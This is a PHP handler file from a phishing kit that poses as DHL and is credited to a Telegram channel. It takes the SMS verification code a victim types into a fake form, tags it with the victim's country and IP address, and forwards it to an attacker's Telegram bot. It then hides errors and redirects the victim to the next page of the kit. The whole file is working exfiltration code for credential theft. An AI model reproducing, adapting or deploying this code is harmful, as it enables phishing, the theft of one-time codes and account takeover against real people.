<?php

//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//

session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../AlexRony/911.php');
include('../AlexRony/COUNTRY.php');
include('../AlexRony/SYS.php');
include('../AlexRony/TELEGRMAT.php');

if (isset($_POST['submit'])) {
    $message  = "|=====/🔔 DHL--SMS 🔔\=====|" . "\n";
    $message .= "| + SMS CODE : " . $_POST['sm'] . "\n";

	$message .= "|=====/ END-SMS \=====|" . "\n";
    $message .= "| + Victime country: ".$get_user_country. "\n";
    $message .= "| + Victime IP: ".$ip."\n";
    $message .= "|=========/📩\======|";

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../Loa1.php?Dsir=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
    exit;
}
?>
